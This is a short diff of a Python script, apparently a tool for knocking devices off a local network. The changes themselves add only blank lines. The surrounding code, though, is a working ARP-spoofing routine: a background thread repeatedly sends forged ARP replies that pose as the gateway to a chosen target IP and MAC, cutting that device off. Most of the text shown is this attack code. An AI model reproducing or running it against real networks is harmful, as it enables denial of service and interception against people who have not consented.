@@ -47,14 +47,17 @@ def scan_network():
 def disconnect_device(ip, mac):
     print(f"[!] Disconnecting {ip} ({mac})")
     DISCONNECTED_DEVICES.add(ip)
+    
     def loop():
         while ip in DISCONNECTED_DEVICES:
             ether = Ether(dst=mac)
             packet = ether / ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP)
             send(packet, verbose=0)
             time.sleep(2)
+    
     from threading import Thread
     Thread(target=loop, daemon=True).start()
+
 
 def restore_device(ip, mac):
     print(f"[+] Restoring {ip} ({mac})")
@@ -166,4 +169,5 @@ def main():
 
 if __name__ == '__main__':
     main()
+
 
